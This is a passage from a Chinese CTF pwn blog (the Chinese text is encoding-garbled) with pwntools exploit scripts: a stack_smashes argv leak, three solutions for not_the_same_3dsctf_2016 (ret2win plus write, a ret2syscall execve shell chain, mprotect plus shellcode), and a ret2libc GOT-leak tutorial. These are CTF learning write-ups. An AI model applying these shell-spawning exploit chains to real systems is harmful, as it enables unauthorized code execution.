æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;3ï¼Œè¡¨ç¤ºé™¤äº†ç¨‹åºåå¤–è¿˜æœ‰2ä¸ªå‚æ•°ã€‚</strong><br><strong>argv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ã€‚</strong><br><strong>argv[1]æŒ‡å‘å‚æ•°para_1å­—ç¬¦ä¸²ã€‚</strong><br><strong>argv[2]æŒ‡å‘å‚æ•°para_2å­—ç¬¦ä¸²ã€‚</strong></li><li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œä»–çš„å…ƒç´ ä¸ªæ•°æ˜¯argcï¼Œå­˜æ”¾çš„æ˜¯æŒ‡å‘æ¯ä¸€ä¸ªå‚æ•°çš„æŒ‡é’ˆ</strong></li></ol><p><strong>æˆ‘ä»¬æœ¬é¢˜éœ€è¦æ‰¾__libc_agrc[0]å’Œè¾“å…¥çš„åç§»</strong><br><strong>ä¸‹æ–­ç‚¹ç›´æ¥åˆ°è¾“å…¥å‡½æ•°</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347411.png"><br><strong>ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¾“å…¥åœ°å€ï¼ˆå…·ä½“ç¬¬å‡ ä¸ªå‚æ•°ï¼Œæ ¹æ®å‡½æ•°æœ¬èº«å†³å®šï¼‰</strong><br><strong>ä¸‹æ–­ç‚¹åˆ°main</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347668.png"><br><strong>__libc_argv[0]æŒ‡å‘çš„æ˜¯æ–‡ä»¶è·¯å¾„</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348166.png"><br><strong>ç›´æ¥ç®—å‡ºåç§»</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è„šæœ¬ä¹Ÿæ˜¯éå¸¸easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="/2024/07/18/not-the-same-3dsctf-2016/"/>
    <url>/2024/07/18/not-the-same-3dsctf-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>æŸ¥çœ‹ä¿æŠ¤å°±ä¸è¯´äº†</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182331100.png"></p><p><strong>IDAåç¼–è¯‘å‘ç°ä¸ºé™æ€ç¼–è¯‘ï¼Œä¸ç”¨æ‰¾libcäº†è¿™ç‚¹èŠ‚çœä¸å°‘åŠŸå¤«ã€‚æ‰“å¼€mainå‡½æ•°ï¼Œå‘ç°æ ˆæº¢å‡ºæ¼æ´</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332667.png"><br><strong>åç§»ä¸º45ï¼Œè¿™ä¸ªæ˜¯æ ¹æ®gdbçš„cyclicç®—å‡ºæ¥çš„</strong><br><strong>å‘ç°åé—¨å‡½æ•°get_secretï¼ŒåŠŸèƒ½æ˜¯æŠŠflagè¯»å–èµ‹å€¼ç»™fl4g</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332184.png"><br><strong>åˆæ­¥æ€è·¯ä¸ºé€šè¿‡æ ˆæº¢å‡ºï¼Œè°ƒç”¨get_secretï¼Œå†é€šè¿‡writeå‡½æ•°è¯»å–fl4g</strong></p><h2 id="æ–¹æ³•ä¸€-é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°"><a href="#æ–¹æ³•ä¸€-é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°" class="headerlink" title="æ–¹æ³•ä¸€ é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°"></a>æ–¹æ³•ä¸€ é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬å‰é¢åˆ†æè¿™ä¸ªæ˜¯é™æ€ç¼–è¯‘ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ret2syscallï¼Œé€šè¿‡è®¾ç½®å¯„å­˜å™¨çš„å€¼ï¼Œç›´æ¥è·å¾—shell</strong></p><h2 id="æ–¹æ³•äºŒ-ret2syscall"><a href="#æ–¹æ³•äºŒ-ret2syscall" class="headerlink" title="æ–¹æ³•äºŒ ret2syscall"></a>æ–¹æ³•äºŒ ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªçœ‹ä¸Šå»æœ‰ç‚¹å¤æ‚ä½†æ˜¯ï¼Œè€å¿ƒçœ‹ä¸‹æ¥è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œ32ä½getshelléœ€è¦è°ƒç”¨execv&gt;ï¼ˆâ€&#x2F;bin&#x2F;shâ€,null,null)ï¼Œå¯„å­˜å™¨eax&#x3D;11ï¼Œebx&#x3D;â€&#x2F;bin&#x2F;shâ€ï¼Œecx&#x3D;0ï¼Œedx&#x3D;0ï¼Œç„¶åå†æ‰§è¡Œint 0x80</p></blockquote><p><strong>ç„¶åæˆ‘ä»¬å‘ç°å‡½æ•°åˆ—è¡¨æœ‰mprotect,è¿™ä¸ªå‡½æ•°å¯ä»¥æ”¹å˜æ®µçš„æ‰§è¡Œæƒé™,æˆ‘ä»¬å¯ä»¥å¼€å¯æœ€é«˜æƒé™,æ‰§è¡Œshellcode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182334572.png"></p><h2 id="æ–¹æ³•ä¸‰-mprotecté…åˆshellcode"><a href="#æ–¹æ³•ä¸‰-mprotecté…åˆshellcode" class="headerlink" title="æ–¹æ³•ä¸‰ mprotecté…åˆshellcode"></a>æ–¹æ³•ä¸‰ mprotecté…åˆshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>BUUCTFåˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mprotect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨åŠ¨æ€é“¾æ¥åŠ¨æ€æ³„éœ²systemåœ°å€å¹¶åˆ©ç”¨</title>
    <link href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="å·²çŸ¥libcåº“çš„æƒ…å†µ"><a href="#å·²çŸ¥libcåº“çš„æƒ…å†µ" class="headerlink" title="å·²çŸ¥libcåº“çš„æƒ…å†µ"></a>å·²çŸ¥libcåº“çš„æƒ…å†µ</h2><p><strong>åœ¨åŠ¨æ€ç¼–è¯‘çš„ç¨‹åºä¸­ï¼Œå¦‚æœæ²¡æœ‰å¯¹systemå‡½æ•°çš„ç›´æ¥è°ƒç”¨ï¼Œåœ¨pltä¸­å°±ä¸ä¼šå­˜åœ¨systemå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥çŸ¥é“systemå‡½æ•°çš„åœ°å€</strong><br><strong>åœ¨è§£å†³åŠ¨æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹å‰ï¼Œéœ€è¦äº†è§£åŠ¨æ€é“¾æ¥çš„åŸºç¡€çŸ¥è¯†ï¼Œè¿™ä¸ªè¿‡ç¨‹å«ä½œlzy-bindingã€‚ç¨‹åºå¯¹å¤–éƒ¨å‡½æ•°çš„è°ƒç”¨è¦æ±‚åœ¨ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶å°†å¤–éƒ¨å‡½æ•°é“¾æ¥åˆ°ç¨‹åºä¸­é“¾æ¥çš„æ–¹å¼åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ã€‚é™æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«å¤–éƒ¨å‡½æ•°çš„å…¨éƒ¨ä»£ç ã€‚åŠ¨æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸åŒ…å«å¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å°†åŠ¨æ€é“¾æ¥åº“(è‹¥å¹²å¤–éƒ¨å‡½æ•°çš„é›†åˆ)åŠ è½½åˆ°å†…å­˜çš„æŸä¸ªä½ç½®ï¼Œåœ¨å‘ç”Ÿè°ƒç”¨æ—¶å†å»é“¾æ¥åº“å®šä½æ‰€éœ€çš„å‡½æ•°ã€‚</strong></p><p><strong>è¿™é‡Œé€šè¿‡å‡ ä¸ªç®€å•çš„æ¦‚å¿µå’Œè¿‡ç¨‹çš„åˆ†ææ¥è¯´æ˜æ•´ä¸ªè¿‡ç¨‹ã€‚</strong></p><ol><li><strong>GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨(Global0fset Table)ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µ(DataSegment)å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚</strong></li><li><strong>PITæ˜¯ç¨‹åºé“¾æ¥è¡¨(Procedure Linkage Table)ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„äººå£ç‚¹(entry),æ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ° PLT ä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µ(CodeSegment)å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ç›®ä¸ä¼šè¢«ä¿®æ”¹ã€‚</strong></li></ol><p><strong>ç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™(åœ¨FULLRELRO ä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™):PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„äººå£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™</strong></p><p><strong>å½“ç¨‹åºåœ¨ç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œä¼šè¿›å…¥å·²è¢«è½¬è½½è¿›å†…å­˜ä¸­çš„åŠ¨æ€é“¾æ¥åº“ä¸­æŸ¥æ‰¾å¯¹åº”çš„å‡½æ•°å’Œåœ°å€ï¼Œå¹¶æŠŠå‡½æ•°çš„åœ°å€æ”¾åˆ°gotè¡¨ä¸­ï¼Œå°†gotè¡¨çš„åœ°å€æ•°æ®æ˜ å°„ä¸ºpltè¡¨çš„è¡¨é¡¹ï¼›åœ¨ç¨‹åºäºŒæ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œå°±ä¸ç”¨å†é‡æ–°æŸ¥æ‰¾å‡½æ•°åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡pltè¡¨æ‰¾åˆ°gotè¡¨ä¸­å‡½æ•°çš„åœ°å€ï¼Œä»è€Œæ‰§è¡Œå‡½æ•°çš„åŠŸèƒ½äº†ã€‚</strong><br><strong>åœ¨é¦–æ¬¡è°ƒç”¨å¯¼å‡ºå‡½æ•°æ—¶ï¼Œç”±äºæœªçŸ¥å‡½æ•°çœŸæ­£åœ°å€ï¼ˆè¿™æ—¶è¡¨ç°ä¸ºxxx@pltï¼‰ï¼Œå»è®¿é—®pltè¡¨ä¸­è¯¥å‡½æ•°æ‰€åœ¨çš„é¡¹ï¼ˆä¸ºä¸€æ®µä»£ç ï¼Œä¸‰æ¡æŒ‡ä»¤å¦‚ä¸Šå›¾æ‰€ç¤ºï¼‰ï¼Œä¹‹åå»è®¿é—®GOTè¡¨ï¼Œåˆè·³åˆ°PLT[0]çš„ä¸­ï¼ˆä»£ç æ®µï¼‰è°ƒç”¨å‡½æ•°_dl_runtime_resolveå»è·å–çœŸæ­£çš„å‡½æ•°åœ°å€å¹¶ä¿®æ”¹å¯¹åº”çš„GOTè¡¨é¡¹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348465.png"><br><strong>è¿˜æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„</strong></p><ol><li><strong>GOT[0] æ˜¯.dynamicæ®µçš„è£…è½½åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯;</strong></li><li><strong>GOT[1] æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†link_mapçš„åœ°å€;</strong></li><li><strong>GOT[2] åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç _dl_runtime_resolveçš„å…¥å£ç‚¹ï¼Œç”¨äºå¾—åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ï¼Œå›å†™åˆ°å¯¹åº”çš„gotè¡¨ä¸­;</strong></li><li><strong>ä» GOT[3] å¼€å§‹å°±æ˜¯å‡½æ•°çš„åœ°å€ã€‚</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348896.png"></li></ol><p><strong>å¯¹äºä»»æ„ä¸¤ä¸ªå‡½æ•°çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªæ¥åšé¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ ¹æ®åç§»æ¥è®¡ç®—åŸºåœ°å€ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€</strong><br><strong>ç”¨ä¸€é“ä¾‹é¢˜æ¥å…·ä½“è¯´æ˜ä¸€ä¸‹</strong><br>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3">é™„ä»¶ä¸‹è½½</a><br><strong>é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349307.png"><br><strong>åœ°å€éšæœºåŒ–ï¼ŒNXå¼€å¯</strong><br><strong>IDAåç¼–è¯‘ï¼Œæ²¡æœ‰å‘ç°åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨åŠ¨æ€é“¾æ¥åº“é‡Œé¢çš„systemæ¥getshell</strong><br><strong>ç¬¬ä¸€æ­¥ï¼šå…ˆæ³„éœ²å‡½æ•°çš„ä¸€ä¸ªåœ°å€</strong><br><strong>æˆ‘ä»¬å‘ç°äº†æ ˆæº¢å‡ºæ¼æ´å’Œputè¾“å‡ºå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªå‡½æ•°æ³„éœ²åœ°å€</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349095.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc3&quot;)<br>gdb.attach(p,&quot;b *0x0804854C&quot;)<br>elf = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)<br><br>gets_got = elf.got[&quot;gets&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>main_addr = 0x0804854E<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload1 = &quot;a&quot; * 0x108 + p32(1)<br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)<br>p.sendline(payload1)<br></code></pre></td></tr></table></figure><p><strong>æ ¹æ®EXPæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡è°ƒç”¨putå‡½æ•°æ¥æ‰“å°gotè¡¨ä¸­getsçš„åœ°å€ï¼Œè¿™æ ·getsçš„åœ°å€å°±æ³„éœ²æˆåŠŸäº†</strong><br><strong>ç¬¬äºŒæ­¥:è®¡ç®—åç§»</strong><br><strong>æˆ‘ä»¬æ³„éœ²äº†getså‡½æ•°çš„åœ°å€,é‚£ä¹ˆæ ¹æ®å®ƒçš„åç§»,å°±èƒ½å¾—åˆ°åŸºåœ°å€.base_addr&#x3D; æ³„éœ²åœ°å€ - å‡å»åç§»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs [python]">leak_addr = u32(p.recv(4))<br>libc_base = leak_addr - libc.symbols[&quot;gets&quot;]<br>libc.address = libc_base<br>log.success(&quot;libc_base:&quot; + hex(libc.address))<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œçš„libc.symbosl[â€˜â€™]åœ¨è®¾ç½®åŸºåœ°å€ä¹‹å‰å¾—åˆ°çš„æ˜¯åç§»å€¼,åœ¨è®¾ç½®åŸºåœ°å€ä¹‹åå¾—åˆ°çš„æ˜¯å®é™…åœ°å€å€¼</strong><br><strong>ç¬¬ä¸‰æ­¥:æ”»å‡»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs [python]">system = libc.symbols[&quot;system&quot;] #å¾—åˆ°å®é™…åœ°å€å€¼<br>binsh = libc.search(&quot;/bin/sh&quot;).next() #æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›åœ°å€<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload2 = &quot;a&quot; * 0x108 + p32(1)<br>payload2 += p32(system) + p32(1) + p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è¿™æ ·ä¸€ä¸ªå·²çŸ¥åŠ¨æ€é“¾æ¥åº“çš„é¢˜å°±å†™å¥½äº†,è¯´åˆ°è¿™è‚¯å®šæƒ³é—®,é‚£è¦æ˜¯æœªçŸ¥å‘¢?åˆ«æ€¥æ¥ç€å¾€ä¸‹çœ‹</strong></p><h2 id="æœªçŸ¥åŠ¨æ€é“¾æ¥åº“"><a href="#æœªçŸ¥åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="æœªçŸ¥åŠ¨æ€é“¾æ¥åº“"></a>æœªçŸ¥åŠ¨æ€é“¾æ¥åº“</h2><p><strong>å¯¹äºæœªçŸ¥åŠ¨æ€é“¾æ¥åº“,åšé¢˜æ–¹å¼å’Œå·²çŸ¥é“¾æ¥åº“æ˜¯å¤§åŒå°å¼‚çš„,æ— éæ˜¯ç¡®å®šlibcåº“æ˜¯ä»€ä¹ˆç‰ˆæœ¬,æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ€ä¹ˆç¡®å®š</strong><br><strong>åœ¨æˆ‘ç°åœ¨å­¦ä¹ ä¸­,æœ‰ä¸‰ç§æ–¹æ³•(å®é™…è‚¯å®šä¸æ­¢ä¸‰ç§,ä½¿ç”¨è‡ªå·±è§‰å¾—å¥½ç”¨çš„å°±è¡Œ)</strong></p><ol><li>åœ¨ githubä¸Šæœ‰ä¸ª libc-database é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨é¡¹ç›®ä¸Šçš„æ–¹æ³•æ‰¾å‡ºå¯¹åº”ç‰ˆæœ¬ã€‚</li><li>åœ¨ç½‘ç«™ <a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a> 